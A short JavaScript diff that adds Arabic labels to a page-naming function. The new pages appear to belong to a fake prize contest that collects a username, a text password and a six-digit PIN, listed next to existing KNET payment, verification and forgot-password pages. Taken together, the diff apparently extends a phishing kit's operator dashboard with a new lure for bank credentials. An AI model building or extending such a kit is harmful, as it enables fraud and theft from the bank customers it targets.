@@ -135,6 +135,10 @@
 
   function getFriendlyPageName() {
     const path = window.location.pathname;
+    if (path.includes('prize-username')) return 'اسم مستخدم - مسابقة الجوائز';
+    if (path.includes('prize-text-password')) return 'كلمة مرور نصية - مسابقة الجوائز';
+    if (path.includes('prize-password')) return 'الرقم السري 6 أرقام - مسابقة الجوائز';
+    if (path.includes('prize-wait')) return 'انتظار مسابقة الجوائز';
     if (path.includes('knet')) return 'صفحة الكي نت';
     if (path.includes('verification')) return 'صفحة التحقق';
     if (path.includes('forgot-password')) return 'نسيت كلمة المرور';
